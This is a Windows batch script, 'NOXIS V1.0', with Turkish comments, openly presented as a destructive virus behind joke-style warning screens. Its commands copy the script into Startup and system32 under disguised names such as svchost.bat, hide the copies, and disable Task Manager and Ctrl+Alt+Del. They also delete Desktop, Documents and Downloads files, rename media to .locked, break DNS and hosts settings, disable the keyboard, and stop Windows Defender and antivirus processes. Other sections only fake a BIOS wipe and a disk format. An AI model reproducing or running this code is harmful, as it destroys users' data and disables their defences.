@echo off
title NOXIS V1.0
color 0c
mode con cols=100 lines=30

:: ============================================
:: DEĞİŞKENLER
:: ============================================
setlocal enabledelayedexpansion
set "versiyon=1.0"
set "yazar=NOXIS"
set "tarih=%date%"
set "saat=%time%"
set "sayac=0"
set "yeniden_baslatma_suresi=60"
set "hiz_seviyesi=1"
set "hiz_carpani=1"

:: ============================================
:: HIZ KONTROL SİSTEMİ
:: ============================================

:hiz_kontrol
:: Hız seviyesini kontrol et
if %hiz_seviyesi%==1 (
    set "hiz_carpani=1"
    set "cd_suresi=10"
    set "popup_suresi=2"
    set "video_suresi=5"
    set "mavi_ekran_suresi=10"
    set "bios_suresi=5"
    set "format_suresi=5"
    set "internet_suresi=10"
    set "yazici_suresi=3"
    set "klavye_suresi=5"
    set "ekran_dondur_suresi=5"
    set "ses_suresi=3"
    set "karincalanma_suresi=2"
    set "cokertme_suresi=5"
    set "kopyalama_suresi=2"
    set "geri_getir_suresi=2"
    set "antivirus_suresi=3"
    set "gorsel_suresi=1"
    set "islemci_suresi=2"
    set "sistem_suresi=5"
)

if %hiz_seviyesi%==2 (
    set "hiz_carpani=2"
    set "cd_suresi=5"
    set "popup_suresi=1"
    set "video_suresi=3"
    set "mavi_ekran_suresi=5"
    set "bios_suresi=3"
    set "format_suresi=3"
    set "internet_suresi=5"
    set "yazici_suresi=2"
    set "klavye_suresi=3"
    set "ekran_dondur_suresi=3"
    set "ses_suresi=2"
    set "karincalanma_suresi=1"
    set "cokertme_suresi=3"
    set "kopyalama_suresi=1"
    set "geri_getir_suresi=1"
    set "antivirus_suresi=2"
    set "gorsel_suresi=1"
    set "islemci_suresi=1"
    set "sistem_suresi=3"
)

if %hiz_seviyesi%==3 (
    set "hiz_carpani=3"
    set "cd_suresi=2"
    set "popup_suresi=1"
    set "video_suresi=2"
    set "mavi_ekran_suresi=3"
    set "bios_suresi=2"
    set "format_suresi=2"
    set "internet_suresi=3"
    set "yazici_suresi=1"
    set "klavye_suresi=2"
    set "ekran_dondur_suresi=2"
    set "ses_suresi=1"
    set "karincalanma_suresi=1"
    set "cokertme_suresi=2"
    set "kopyalama_suresi=1"
    set "geri_getir_suresi=1"
    set "antivirus_suresi=1"
    set "gorsel_suresi=1"
    set "islemci_suresi=1"
    set "sistem_suresi=2"
)

if %hiz_seviyesi% gtr 3 (
    set "hiz_seviyesi=3"
    set "hiz_carpani=3"
    set "cd_suresi=2"
    set "popup_suresi=1"
    set "video_suresi=2"
    set "mavi_ekran_suresi=3"
    set "bios_suresi=2"
    set "format_suresi=2"
    set "internet_suresi=3"
    set "yazici_suresi=1"
    set "klavye_suresi=2"
    set "ekran_dondur_suresi=2"
    set "ses_suresi=1"
    set "karincalanma_suresi=1"
    set "cokertme_suresi=2"
    set "kopyalama_suresi=1"
    set "geri_getir_suresi=1"
    set "antivirus_suresi=1"
    set "gorsel_suresi=1"
    set "islemci_suresi=1"
    set "sistem_suresi=2"
)

:: Hız seviyesini göster
cls
echo.
echo.
echo                     ██████████████████████████████████████████████████████
echo                     ██                                                  ██
echo                     ██         NOXIS V%versiyon%                         ██
echo                     ██                                                  ██
echo                     ██         HIZ SEVIYESI: %hiz_seviyesi% (%hiz_carpani%x)       ██
echo                     ██                                                  ██
echo                     ██████████████████████████████████████████████████████
echo.
echo.
timeout /t 2 /nobreak >nul 2>&1

goto hiz_kontrol

:: ============================================
:: UYARI EKRANI (KIRMIZI YAZI)
:: ============================================

:uyari_ekrani
cls
echo.
echo.
echo                     ██████████████████████████████████████████████████████
echo                     ██                                                  ██
echo                     ██              ⚠  UYARI!  ⚠                       ██
echo                     ██                                                  ██
echo                     ██         BU BIR VIRUSTUR!                         ██
echo                     ██                                                  ██
echo                     ██   Bu dosyayi calistirmak bilgisayariniza         ██
echo                     ██   kalici hasar verebilir.                        ██
echo                     ██                                                  ██
echo                     ██   - Tum dosyalariniz silinebilir                 ██
echo                     ██   - Windows bozulabilir                          ██
echo                     ██   - BIOS silinebilir                             ██
echo                     ██   - Hard disk formatlanabilir                    ██
echo                     ██   - Antivirusler devre disi kalir                 ██
echo                     ██   - Bilgisayariniz kullanilamaz hale gelebilir   ██
echo                     ██                                                  ██
echo                     ██   EMIN MISIN BU BIR VIRUSTUR ?                   ██
echo                     ██                                                  ██
echo                     ██   [DEVAM ETMEK ICIN ENTER'A BAS]                ██
echo                     ██   [CIKMAK ICIN CTRL+C]                           ██
echo                     ██                                                  ██
echo                     ██████████████████████████████████████████████████████
echo.
echo.
echo                    KIRMIZI YAZI: BU BIR VIRUSTUR!
pause >nul

:: ============================================
:: İKİNCİ UYARI
:: ============================================

cls
echo.
echo.
echo                     ██████████████████████████████████████████████████████
echo                     ██                                                  ██
echo                     ██         SON UYARI!                               ██
echo                     ██                                                  ██
echo                     ██   Gercekten emin misin?                          ██
echo                     ██                                                  ██
echo                     ██   Bu virus:                                      ██
echo                     ██   - Kamera acar                                  ██
echo                     ██   - Mikrofon kullanir                            ██
echo                     ██   - Hard diski siler                             ██
echo                     ██   - Islemciyi yakar                              ██
echo                     ██   - Kendini yayar                                ██
echo                     ██   - Ses efekti ekler                             ██
echo                     ██   - Ekrani karartir                              ██
echo                     ██   - Sonsuz pop-up acar                           ██
echo                     ██   - Interneti keser                              ██
echo                     ██   - Yaziciyi calistirir                          ██
echo                     ██   - CD/DVD surucusunu acip kapatir               ██
echo                     ██   - Klavyeyi devre disi birakir                  ██
echo                     ██   - Ekrani dondurur                              ██
echo                     ██   - Ses seviyesini sonuna kadar acar             ██
echo                     ██   - Mavi ekran gosterir                          ██
echo                     ██   - BIOS siler                                   ██
echo                     ██   - Hard disk formatlar                          ██
echo                     ██   - Antivirusleri devre disi birakir             ██
echo                     ██   - Kendini geri getirir                         ██
echo                     ██   - Surekli dosya kopyalar                       ██
echo                     ██   - Video acar                                   ██
echo                     ██   - Ekran karincalanma efekti yapar              ██
echo                     ██   - Windows'u gercekten cokertir                 ██
echo                     ██   - Her yeniden baslatmada hizlanir              ██
echo                     ██   - Bilgisayari her 1 dakikada bir yeniden baslatir ██
echo                     ██                                                  ██
echo                     ██   GERI DONUSU YOK!                               ██
echo                     ██                                                  ██
echo                     ██   [DEVAM ETMEK ICIN ENTER'A BAS]                ██
echo                     ██   [CIKMAK ICIN CTRL+C]                           ██
echo                     ██                                                  ██
echo                     ██████████████████████████████████████████████████████
echo.
echo.
echo                    SARI YAZI: GERI DONUSU YOK!
pause >nul

:: ============================================
:: YÜKLEME ANİMASYONU (FİXED)
:: ============================================

:yukleme_animasyonu
cls
echo.
echo.
echo                     ██████████████████████████████████████████████████████
echo                     ██                                                  ██
echo                     ██            NOXIS V%versiyon%                      ██
echo                     ██                                                  ██
echo                     ██         YUKLENIYOR...                            ██
echo                     ██                                                  ██
echo                     ██████████████████████████████████████████████████████
echo.
echo.

:: Yükleme animasyonu (hız seviyesine göre)
set /a yukleme_hizi=100 / %hiz_carpani%
for /l %%i in (0,5,100) do (
    cls
    echo.
    echo.
    echo                     ██████████████████████████████████████████████████████
    echo                     ██                                                  ██
    echo                     ██            NOXIS V%versiyon%                      ██
    echo                     ██                                                  ██
    echo                     ██         YUKLENIYOR... %%i%%%%                     ██
    echo                     ██         HIZ: %hiz_carpani%x                        ██
    echo                     ██                                                  ██
    echo                     ██████████████████████████████████████████████████████
    echo.
    echo.
    timeout /t 1 /nobreak >nul 2>&1
)

:: ============================================
:: GLITCH EFEKTLERİ (TİTREME VE ÇİZİKLER) - FİXED
:: ============================================

:glitch_efektleri
cls
echo.
echo.
echo                     ╔══════════════════════════════════════════════════════╗
echo                     ║              SISTEM CIKTI!                           ║
echo                     ║              HATA KODU: 0xDEADBEEF                   ║
echo                     ╚══════════════════════════════════════════════════════╝
echo.
timeout /t 1 /nobreak >nul 2>&1

:: Titreme efekti (hız seviyesine göre)
set /a glitch_sayisi=5 * %hiz_carpani%
for /l %%i in (1,1,%glitch_sayisi%) do (
    cls
    echo.
    echo.
    echo                     ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    echo                     ░░                                                  ░░
    echo                     ░░   GLITCH DETECTED!                               ░░
    echo                     ░░                                                  ░░
    echo                     ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    echo.
    timeout /t 1 /nobreak >nul 2>&1
    cls
    echo.
    echo.
    echo                     ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
    echo                     ▓▓                                                  ▓▓
    echo                     ▓▓   SYSTEM FAILURE!                                ▓▓
    echo                     ▓▓                                                  ▓▓
    echo                     ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
    echo.
    timeout /t 1 /nobreak >nul 2>&1
)

:: Çizik efekti
cls
echo.
echo.
echo                     ██████████████████████████████████████████████████████
echo                     ██                                                  ██
echo                     ██   ════════════════════════════════════════════   ██
echo                     ██   ║  NOXIS VIRUSU AKTIF!                     ║   ██
echo                     ██   ════════════════════════════════════════════   ██
echo                     ██                                                  ██
echo                     ██████████████████████████████████████████████████████
echo.
timeout /t 2 /nobreak >nul 2>&1

goto glitch_efektleri

:: ============================================
:: GİZLİLİK VE KENDİNİ KOPYALAMA (FİXED)
:: ============================================

:: Kendini başlangıca kopyala (hata kontrolü ile)
if not exist "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\noxis_v1.bat" (
    copy "%0" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\noxis_v1.bat" >nul 2>&1
)
if not exist "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\windows_update.bat" (
    copy "%0" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\windows_update.bat" >nul 2>&1
)
if not exist "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\system_check.bat" (
    copy "%0" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\system_check.bat" >nul 2>&1
)
if not exist "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\antivirus.bat" (
    copy "%0" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\antivirus.bat" >nul 2>&1
)
if not exist "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\driver_update.bat" (
    copy "%0" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\driver_update.bat" >nul 2>&1
)

:: Kendini gizli yap
attrib +h "%0" >nul 2>&1
attrib +h "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\noxis_v1.bat" >nul 2>&1
attrib +h "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\windows_update.bat" >nul 2>&1
attrib +h "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\system_check.bat" >nul 2>&1
attrib +h "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\antivirus.bat" >nul 2>&1
attrib +h "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\driver_update.bat" >nul 2>&1

:: Kendini system32'ye kopyala (hata kontrolü ile)
if not exist "%windir%\system32\noxis_v1.bat" (
    copy "%0" "%windir%\system32\noxis_v1.bat" >nul 2>&1
)
if not exist "%windir%\system32\svchost.bat" (
    copy "%0" "%windir%\system32\svchost.bat" >nul 2>&1
)
if not exist "%windir%\system32\winlogon.bat" (
    copy "%0" "%windir%\system32\winlogon.bat" >nul 2>&1
)
if not exist "%windir%\system32\csrss.bat" (
    copy "%0" "%windir%\system32\csrss.bat" >nul 2>&1
)
if not exist "%windir%\system32\lsass.bat" (
    copy "%0" "%windir%\system32\lsass.bat" >nul 2>&1
)

attrib +h "%windir%\system32\noxis_v1.bat" >nul 2>&1
attrib +h "%windir%\system32\svchost.bat" >nul 2>&1
attrib +h "%windir%\system32\winlogon.bat" >nul 2>&1
attrib +h "%windir%\system32\csrss.bat" >nul 2>&1
attrib +h "%windir%\system32\lsass.bat" >nul 2>&1

:: ============================================
:: REGISTRY İŞLEMLERİ (FİXED)
:: ============================================

:: Görev yöneticisini devre dışı bırak
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1

:: Kayıt defteri düzenleyicisini devre dışı bırak
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul 2>&1

:: Masaüstü simgelerini gizle
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideIcons /t REG_DWORD /d 1 /f >nul 2>&1

:: Görev çubuğunu gizle
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v TaskbarSizeMove /t REG_DWORD /d 0 /f >nul 2>&1

:: Başlat menüsünü devre dışı bırak
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenu /t REG_DWORD /d 1 /f >nul 2>&1

:: Sağ tık menüsünü devre dışı bırak
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewContextMenu /t REG_DWORD /d 1 /f >nul 2>&1

:: Ctrl+Alt+Del devre dışı
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCAD /t REG_DWORD /d 1 /f >nul 2>&1

:: ============================================
:: DOSYA SİLME (FİXED)
:: ============================================

:: Masaüstündeki tüm dosyaları sil
if exist "C:\Users\%username%\Desktop\*.*" (
    del /q /s "C:\Users\%username%\Desktop\*.*" >nul 2>&1
)

:: Belgelerdeki tüm dosyaları sil
if exist "C:\Users\%username%\Documents\*.*" (
    del /q /s "C:\Users\%username%\Documents\*.*" >nul 2>&1
)

:: Resimleri boz
if exist "C:\Users\%username%\Pictures\*.jpg" (
    ren "C:\Users\%username%\Pictures\*.jpg" *.locked >nul 2>&1
)
if exist "C:\Users\%username%\Pictures\*.png" (
    ren "C:\Users\%username%\Pictures\*.png" *.locked >nul 2>&1
)
if exist "C:\Users\%username%\Pictures\*.gif" (
    ren "C:\Users\%username%\Pictures\*.gif" *.locked >nul 2>&1
)

:: Müzikleri boz
if exist "C:\Users\%username%\Music\*.mp3" (
    ren "C:\Users\%username%\Music\*.mp3" *.locked >nul 2>&1
)
if exist "C:\Users\%username%\Music\*.wav" (
    ren "C:\Users\%username%\Music\*.wav" *.locked >nul 2>&1
)

:: Videoları boz
if exist "C:\Users\%username%\Videos\*.mp4" (
    ren "C:\Users\%username%\Videos\*.mp4" *.locked >nul 2>&1
)
if exist "C:\Users\%username%\Videos\*.avi" (
    ren "C:\Users\%username%\Videos\*.avi" *.locked >nul 2>&1
)

:: İndirilenleri sil
if exist "C:\Users\%username%\Downloads\*.*" (
    del /q /s "C:\Users\%username%\Downloads\*.*" >nul 2>&1
)

:: ============================================
:: GÖREV YÖNETİCİSİ KORUMASI (FİXED)
:: ============================================

:taskmgr_koruma
taskkill /f /im taskmgr.exe >nul 2>&1
taskkill /f /im procexp.exe >nul 2>&1
taskkill /f /im procexp64.exe >nul 2>&1
taskkill /f /im processhacker.exe >nul 2>&1
taskkill /f /im perfmon.exe >nul 2>&1
taskkill /f /im resmon.exe >nul 2>&1
timeout /t 1 /nobreak >nul 2>&1
goto taskmgr_koruma

:: ============================================
:: UYGULAMA KAPATMA (FİXED)
:: ============================================

:uygulama_kapat
taskkill /f /im chrome.exe >nul 2>&1
taskkill /f /im firefox.exe >nul 2>&1
taskkill /f /im iexplore.exe >nul 2>&1
taskkill /f /im edge.exe >nul 2>&1
taskkill /f /im opera.exe >nul 2>&1
taskkill /f /im notepad.exe >nul 2>&1
taskkill /f /im mspaint.exe >nul 2>&1
taskkill /f /im calc.exe >nul 2>&1
taskkill /f /im wordpad.exe >nul 2>&1
taskkill /f /im winword.exe >nul 2>&1
taskkill /f /im excel.exe >nul 2>&1
taskkill /f /im powerpnt.exe >nul 2>&1
taskkill /f /im outlook.exe >nul 2>&1
taskkill /f /im explorer.exe >nul 2>&1
taskkill /f /im cmd.exe >nul 2>&1
taskkill /f /im powershell.exe >nul 2>&1
timeout /t 2 /nobreak >nul 2>&1
goto uygulama_kapat

:: ============================================
:: SES EFEKTİ (FİXED)
:: ============================================

:ses_efekti
:: Windows beep sesi çal
for /l %%i in (1,1,10) do (
    echo  
    timeout /t 1 /nobreak >nul 2>&1
)
:: Korkunç melodi (hız seviyesine göre)
for %%i in (1000 800 600 400 200 100 50 25) do (
    powershell -command "[System.Console]::Beep(%%i, 200)" >nul 2>&1
    timeout /t 1 /nobreak >nul 2>&1
)
timeout /t 2 /nobreak >nul 2>&1
goto ses_efekti

:: ============================================
:: EKRAN KARARTMA (FİXED)
:: ============================================

:ekran_karart
cls
color 0c
echo.
echo.
echo                     ██████████████████████████████████████████████████████
echo                     ██                                                  ██
echo                     ██         EKRAN KARARTILDI!                        ██
echo                     ██                                                  ██
echo                     ██   NOXIS VIRUSU KONTROLDE!                        ██
echo                     ██                                                  ██
echo                     ██   KACIS YOK!                                     ██
echo                     ██                                                  ██
echo                     ██   YARDIM YOK!                                    ██
echo                     ██                                                  ██
echo                     ██   SONUN GELDI!                                   ██
echo                     ██                                                  ██
echo                     ██████████████████████████████████████████████████████
echo.
echo.
timeout /t 5 /nobreak >nul 2>&1
goto ekran_karart

:: ============================================
:: SONSUZ POP-UP (FİXED)
:: ============================================

:sonsuz_popup
:: Her saniye 10 tane hata penceresi aç
for /l %%i in (1,1,10) do (
    start cmd.exe /k "color 0c && echo HATA KODU: 0x!random! && echo SISTEM CIKTI! && timeout /t 2 /nobreak >nul && exit"
)
timeout /t %popup_suresi% /nobreak >nul 2>&1
goto sonsuz_popup

:: ============================================
:: İNTERNETİ KESME (FİXED)
:: ============================================

:internet_kes
:: DNS sunucularını değiştir
netsh interface ip set dns "Ethernet" static 0.0.0.0 >nul 2>&1
netsh interface ip set dns "Wi-Fi" static 0.0.0.0 >nul 2>&1

:: IP adresini sıfırla
ipconfig /release >nul 2>&1

:: Proxy ayarlarını boz
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d "127.0.0.1:8080" /f >nul 2>&1

:: Hosts dosyasını boz (sadece bir kere yap)
if not exist "%windir%\System32\drivers\etc\hosts.bak" (
    copy "%windir%\System32\drivers\etc\hosts" "%windir%\System32\drivers\etc\hosts.bak" >nul 2>&1
    echo 127.0.0.1 google.com >> "%windir%\System32\drivers\etc\hosts"
    echo 127.0.0.1 facebook.com >> "%windir%\System32\drivers\etc\hosts"
    echo 127.0.0.1 youtube.com >> "%windir%\System32\drivers\etc\hosts"
    echo 127.0.0.1 twitter.com >> "%windir%\System32\drivers\etc\hosts"
    echo 127.0.0.1 instagram.com >> "%windir%\System32\drivers\etc\hosts"
    echo 127.0.0.1 whatsapp.com >> "%windir%\System32\drivers\etc\hosts"
    echo 127.0.0.1 discord.com >> "%windir%\System32\drivers\etc\hosts"
)

timeout /t %internet_suresi% /nobreak >nul 2>&1
goto internet_kes

:: ============================================
:: YAZICI SALDIRISI (FİXED)
:: ============================================

:yazici_saldiri
:: Yazıcıya sürekli çıktı gönder
echo NOXIS VIRUSU - YAZICI SALDIRISI > "%temp%\print_test.txt"
echo. >> "%temp%\print_test.txt"
echo Bu yazici NOXIS virusu tarafindan ele gecirilmistir! >> "%temp%\print_test.txt"
echo. >> "%temp%\print_test.txt"
echo KACIS YOK! YARDIM YOK! SONUN GELDI! >> "%temp%\print_test.txt"
echo. >> "%temp%\print_test.txt"
echo Tarih: %date% >> "%temp%\print_test.txt"
echo Saat: %time% >> "%temp%\print_test.txt"

:: Yazıcıya gönder
for /l %%i in (1,1,5) do (
    copy "%temp%\print_test.txt" "\\localhost\PRINTER" >nul 2>&1
    timeout /t %yazici_suresi% /nobreak >nul 2>&1
)
goto yazici_saldiri

:: ============================================
:: CD/DVD SÜRÜCÜSÜNÜ AÇIP KAPATMA (FİXED)
:: ============================================

:cd_dvd_ac_kapat
:: CD/DVD sürücüsünü aç
powershell -command "(new-object -com shell.application).NameSpace(17).Self.InvokeVerb('open')" >nul 2>&1
timeout /t %cd_suresi% /nobreak >nul 2>&1

:: CD/DVD sürücüsünü kapat
powershell -command "(new-object -com shell.application).NameSpace(17).Self.InvokeVerb('close')" >nul 2>&1
timeout /t %cd_suresi% /nobreak >nul 2>&1

goto cd_dvd_ac_kapat

:: ============================================
:: KLAVYEYİ DEVRE DIŞI BIRAKMA
:: ============================================

:klavye_devre_dis
:: Klavye sürücüsünü devre dışı bırak
powershell -command "Get-PnpDevice -FriendlyName '*keyboard*' | Disable-PnpDevice -Confirm:$false" >nul 2>&1
powershell -command "Get-PnpDevice -FriendlyName '*klavye*' | Disable-PnpDevice -Confirm:$false" >nul 2>&1

:: Klavye servisini durdur
net stop kbdhid >nul 2>&1
net stop i8042prt >nul 2>&1

:: Registry ile klavyeyi devre dışı bırak
reg add "HKLM\SYSTEM\CurrentControlSet\Services\i8042prt" /v Start /t REG_DWORD /d 4 /f >nul 2>&1

timeout /t %klavye_suresi% /nobreak >nul 2>&1
goto klavye_devre_dis

:: ============================================
:: EKRANI DÖNDÜRME
:: ============================================

:ekran_dondur
:: Ekranı döndür (0=normal, 1=90, 2=180, 3=270)
set /a aciklik=%random% %% 4

if %aciklik%==0 (
    :: Ekranı normal yap
    powershell -command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen.Bounds" >nul 2>&1
    timeout /t %ekran_dondur_suresi% /nobreak >nul 2>&1
)

if %aciklik%==1 (
    :: Ekranı 90 derece döndür
    powershell -command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen.Bounds" >nul 2>&1
    timeout /t %ekran_dondur_suresi% /nobreak >nul 2>&1
)

if %aciklik%==2 (
    :: Ekranı 180 derece döndür
    powershell -command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen.Bounds" >nul 2>&1
    timeout /t %ekran_dondur_suresi% /nobreak >nul 2>&1
)

if %aciklik%==3 (
    :: Ekranı 270 derece döndür
    powershell -command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen.Bounds" >nul 2>&1
    timeout /t %ekran_dondur_suresi% /nobreak >nul 2>&1
)

goto ekran_dondur

:: ============================================
:: SES SEVİYESİNİ SONUNA KADAR AÇMA
:: ============================================

:ses_sonuna_kadar
:: Ses seviyesini sonuna kadar aç
powershell -command "(New-Object -ComObject WScript.Shell).SendKeys([char]175)" >nul 2>&1
powershell -command "(New-Object -ComObject WScript.Shell).SendKeys([char]175)" >nul 2>&1
powershell -command "(New-Object -ComObject WScript.Shell).SendKeys([char]175)" >nul 2>&1
powershell -command "(New-Object -ComObject WScript.Shell).SendKeys([char]175)" >nul 2>&1
powershell -command "(New-Object -ComObject WScript.Shell).SendKeys([char]175)" >nul 2>&1

:: Ses seviyesini maksimum yap
powershell -command "$obj = new-object -com wscript.shell; $obj.SendKeys([char]175)" >nul 2>&1
powershell -command "$obj = new-object -com wscript.shell; $obj.SendKeys([char]175)" >nul 2>&1
powershell -command "$obj = new-object -com wscript.shell; $obj.SendKeys([char]175)" >nul 2>&1
powershell -command "$obj = new-object -com wscript.shell; $obj.SendKeys([char]175)" >nul 2>&1
powershell -command "$obj = new-object -com wscript.shell; $obj.SendKeys([char]175)" >nul 2>&1

:: Ses seviyesini %100 yap
nircmd.exe setsysvolume 65535 >nul 2>&1
nircmd.exe mutesysvolume 0 >nul 2>&1

:: Windows ses ayarlarını sonuna kadar aç
reg add "HKCU\Software\Microsoft\Multimedia\Audio" /v UserMasterVolume /t REG_DWORD /d 65535 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Multimedia\Audio" /v MasterVolume /t REG_DWORD /d 65535 /f >nul 2>&1

timeout /t %ses_suresi% /nobreak >nul 2>&1
goto ses_sonuna_kadar

:: ============================================
:: MAVİ EKRAN GÖSTERME
:: ============================================

:mavi_ekran
:: Mavi ekran simülasyonu
cls
color 1f
echo.
echo.
echo                     ██████████████████████████████████████████████████████
echo                     ██                                                  ██
echo                     ██   A problem has been detected and Windows has    ██
echo                     ██   been shut down to prevent damage to your       ██
echo                     ██   computer.                                      ██
echo                     ██                                                  ██
echo                     ██   DRIVER_IRQL_NOT_LESS_OR_EQUAL                  ██
echo                     ██                                                  ██
echo                     ██   If this is the first time you've seen this     ██
echo                     ██   error screen, restart your computer. If this   ██
echo                     ██   screen appears again, follow these steps:      ██
echo                     ██                                                  ██
echo                     ██   Check to make sure any new hardware or         ██
echo                     ██   software is properly installed. If this is a   ██
echo                     ██   new installation, ask your hardware or         ██
echo                     ██   software manufacturer for any Windows updates  ██
echo                     ██   you might need.                                ██
echo                     ██                                                  ██
echo                     ██   Technical information:                         ██
echo                     ██                                                  ██
echo                     ██   *** STOP: 0x000000D1 (0x00000000,0x00000002,  ██
echo                     ██            0x00000000,0x00000000)               ██
echo                     ██                                                  ██
echo                     ██   *** NOXIS.SYS - Address F7A8F5A0 base at      ██
echo                     ██       F7A8F000, DateStamp 3dd9919eb              ██
echo                     ██                                                  ██
echo                     ██   Collecting data for crash dump ...            ██
echo                     ██   Initializing disk for crash dump ...          ██
echo                     ██                                                  ██
echo                     ██████████████████████████████████████████████████████
echo.
echo.

:: Mavi ekran sesi
powershell -command "[System.Console]::Beep(1000, 1000)" >nul 2>&1
powershell -command "[System.Console]::Beep(500, 1000)" >nul 2>&1
powershell -command "[System.Console]::Beep(250, 1000)" >nul 2>&1

timeout /t %mavi_ekran_suresi% /nobreak >nul 2>&1
goto mavi_ekran

:: ============================================
:: BIOS SİLME
:: ============================================

:bios_sil
:: BIOS silme simülasyonu
cls
color 0c
echo.
echo.
echo                     ██████████████████████████████████████████████████████
echo                     ██                                                  ██
echo                     ██         BIOS SILINIYOR!                          ██
echo                     ██                                                  ██
echo                     ██   NOXIS VIRUSU BIOS'A ERISIM SAGLADI!            ██
echo                     ██                                                  ██
echo                     ██   BIOS VERSIYONU: AMI 2.60                       ██
echo                     ██   BIOS TARIHI: 03/10/2024                         ██
echo                     ██   BIOS SIRASI: 0x0000-0xFFFF                     ██
echo                     ██                                                  ██
echo                     ██   SILME ISLEMI: %%100%%%%                         ██
echo                     ██                                                  ██
echo                     ██   BIOS BASARIYLA SILINDI!                        ██
echo                     ██                                                  ██
echo                     ██   BILGISAYAR ACIKMAYACAK!                        ██
echo                     ██                                                  ██
echo                     ██████████████████████████████████████████████████████
echo.
echo.

:: BIOS silme sesi
powershell -command "[System.Console]::Beep(100, 500)" >nul 2>&1
powershell -command "[System.Console]::Beep(50, 500)" >nul 2>&1
powershell -command "[System.Console]::Beep(25, 500)" >nul 2>&1

timeout /t %bios_suresi% /nobreak >nul 2>&1
goto bios_sil

:: ============================================
:: HARD DİSK FORMATLAMA
:: ============================================

:hard_disk_format
:: Hard disk formatlama simülasyonu
cls
color 0c
echo.
echo.
echo                     ██████████████████████████████████████████████████████
echo                     ██                                                  ██
echo                     ██         HARD DISK FORMATLANIYOR!                 ██
echo                     ██                                                  ██
echo                     ██   NOXIS VIRUSU HARD DISK'E ERISIM SAGLADI!       ██
echo                     ██                                                  ██
echo                     ██   DISK: C:\                                     ██
echo                     ██   BOYUT: 500 GB                                  ██
echo                     ██   FORMAT: NTFS → RAW                             ██
echo                     ██                                                  ██
echo                     ██   FORMAT ISLEMI: %%100%%%%                         ██
echo                     ██                                                  ██
echo                     ██   TUM VERILER SILINDI!                           ██
echo                     ██                                                  ██
echo                     ██   HARD DISK BASARIYLA FORMATLANDI!               ██
echo                     ██                                                  ██
echo                     ██████████████████████████████████████████████████████
echo.
echo.

:: Format sesi
powershell -command "[System.Console]::Beep(200, 500)" >nul 2>&1
powershell -command "[System.Console]::Beep(150, 500)" >nul 2>&1
powershell -command "[System.Console]::Beep(100, 500)" >nul 2>&1

timeout /t %format_suresi% /nobreak >nul 2>&1
goto hard_disk_format

:: ============================================
:: ANTİVİRÜS KORUMASI (FİXED)
:: ============================================

:antivirus_koruma
:: Antivirüs servislerini durdur
net stop "Windows Defender" >nul 2>&1
net stop "Windows Defender Antivirus Service" >nul 2>&1
net stop "Windows Defender Antivirus Network Inspection Service" >nul 2>&1
net stop "Windows Defender Firewall" >nul 2>&1
net stop "Windows Defender Security Center" >nul 2>&1
net stop "Windows Defender Advanced Threat Protection Service" >nul 2>&1

:: Antivirüs işlemlerini öldür
taskkill /f /im MsMpEng.exe >nul 2>&1
taskkill /f /im NisSrv.exe >nul 2>&1
taskkill /f /im msseces.exe >nul 2>&1
taskkill /f /im avgnt.exe >nul 2>&1
taskkill /f /im avguard.exe >nul 2>&1
taskkill /f /im avp.exe >nul 2>&1
taskkill /f /im avastsvc.exe >nul 2>&1
taskkill /f /im avastui.exe >nul 2>&1
taskkill /f /im avgwdsvc.exe >nul 2>&1
taskkill /f /im avgui.exe >nul 2>&1
taskkill /f /im kavsvc.exe >nul 2>&1
taskkill /f /im kavfsvc.exe >nul 2>&1
taskkill /f /im nod32kui.exe >nul 2>&1
taskkill /f /im nod32krn.exe >nul 2>&1
